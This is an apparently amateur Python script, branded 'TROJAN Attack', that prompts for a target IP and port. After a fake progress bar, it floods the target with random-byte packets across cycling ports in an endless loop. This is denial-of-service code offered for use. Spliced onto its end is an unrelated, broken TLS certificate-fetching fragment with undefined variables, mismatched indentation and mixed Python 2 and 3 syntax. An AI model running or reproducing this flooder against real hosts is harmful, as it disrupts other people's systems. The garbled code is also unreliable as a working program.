import sys
import os
import time
import socket
import random
import ssl
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
bytes = random._urandom(5890)
#############

os.system("clear")
os.system("figlet TROJAN Attack")
print
os.system("clear")
os.system("figlet TROJAN Attack")
print
print "Author   : zhicco234"
print "github   : https://github.com/zhicco234"
print
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s trojan to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
 elif argc == 2:
       iptarget = argv[1]
        port = 443
    elif argc == 3:
      iptarget = argv[1]
        port = int(argv[2])
    else:
        print('usage: {} [hostname] [port]'.format(argv[0]), file=sys.stderr)
        exit(1)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    with socket.create_connection((hostname, port)) as sock:
        with ctx.wrap_socket(sock, server_iptarget) as ssock:
            print(ssl.DER_cert_to_PEM_cert(ssock.getpeercert(True)), end='')

if __name__ == '__main__':
    main(len(sys.argv), sys.argv)
